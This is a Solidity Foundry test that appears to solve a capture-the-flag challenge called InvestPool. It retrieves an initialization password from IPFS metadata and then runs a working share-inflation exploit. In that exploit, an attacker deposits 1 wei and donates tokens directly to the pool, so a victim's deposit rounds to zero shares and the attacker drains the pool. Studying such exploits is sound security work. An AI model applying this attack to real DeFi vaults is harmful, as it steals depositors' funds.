// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/InvestPool/poolToken.sol";
import "../src/InvestPool/investPool.sol";

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
        
        // the password is hide in the metadata file on IPFS
        // link: https://ipfs.io/ipfs/QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V
        string memory password = "j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx";
        pool.initialize(password);

        vm.startPrank(hacker);
        pool.deposit(1);

        emit log_named_uint("The shares that the hacker gets is", pool.tokenToShares(1));

        token.transfer(address(pool), 100 ether);
        vm.stopPrank();

        userDeposit(100 ether);
        emit log_named_uint("The shares that the user gets is", pool.tokenToShares(100 ether));

				vm.startPrank(hacker);
        emit log_named_uint("the token that the hacker withdraw", pool.sharesToToken(1));
        pool.withdrawAll();
        emit log_named_uint("hacker balance", token.balanceOf(hacker));
        vm.stopPrank();


        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}